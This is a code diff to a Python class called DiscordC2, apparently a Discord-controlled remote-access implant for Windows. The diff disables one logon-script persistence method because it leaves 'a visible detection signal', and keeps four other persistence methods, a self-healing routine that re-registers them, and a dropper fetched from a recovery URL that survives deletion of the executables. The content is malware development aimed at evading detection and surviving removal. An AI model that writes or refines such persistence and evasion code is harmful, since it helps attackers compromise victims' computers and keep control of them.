@@ -252,8 +252,11 @@ class DiscordC2(discord.Client):
                 results.append(msg3)
                 ok4, msg4 = self.setup_registry_load_key(trigger_cmd)
                 results.append(msg4)
-                ok5, msg5 = self.setup_userinit_logon_script(trigger_cmd)
-                results.append(msg5)
+                # UserInitMprLogonScript disabled — causes Explorer.exe to briefly
+                # appear as a parent process at logon, which is a visible detection signal.
+                # The remaining 4 methods provide sufficient persistence redundancy.
+                # ok5, msg5 = self.setup_userinit_logon_script(trigger_cmd)
+                # results.append(msg5)
                 # Deploy dropper (recovery stage) — survives full deletion of all EXE copies
                 if RECOVERY_URL:
                     drp_files = self._write_dropper(RECOVERY_URL)
@@ -2296,9 +2299,11 @@ class DiscordC2(discord.Client):
                          "Load") != trigger_cmd:
                 self.setup_registry_load_key(trigger_cmd)
 
-            if _read_reg(winreg.HKEY_CURRENT_USER, "Environment",
-                         "UserInitMprLogonScript") != trigger_cmd:
-                self.setup_userinit_logon_script(trigger_cmd)
+            # UserInitMprLogonScript disabled — causes Explorer.exe parent process
+            # visibility at logon. Do not re-register during self-heal.
+            # if _read_reg(winreg.HKEY_CURRENT_USER, "Environment",
+            #              "UserInitMprLogonScript") != trigger_cmd:
+            #     self.setup_userinit_logon_script(trigger_cmd)
         except Exception:
             pass
 
